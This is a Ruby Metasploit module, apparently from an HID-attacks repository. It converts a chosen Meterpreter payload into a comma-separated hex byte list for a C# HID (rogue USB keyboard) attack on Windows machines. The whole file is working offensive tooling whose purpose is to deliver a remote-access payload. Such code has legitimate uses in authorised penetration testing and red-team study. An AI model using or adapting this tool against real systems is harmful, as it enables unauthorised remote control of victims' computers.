##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Payload Hex Code Generator',
      'Description'   => %q{
        This module will generate a hex code output for the selected
        meterpreter payload. This is for use in the C# HID attack vector
        included in this repo.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Josh Hale "sn0wfa11"' ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> 'Apr 25 2016',
      'References'    =>
        [
          ['URL', 'https://github.com/jhale85446/HID-Attacks']
        ]
    ))
  end

  # Run Method for when run command is issued
  def exploit
    if !datastore['DisablePayloadHandler']
      fail_with(Failure::Unknown, "Disable the payload handler: 'set DisablePayloadHandler true'")
      return
    end

    print_status("Here comes your payload in hex:\n")

    output = payload.encoded.each_byte.map {|b| "0x#{b.to_s(16)}"}.join(',')

    print("#{output}\n\n")
  end
end

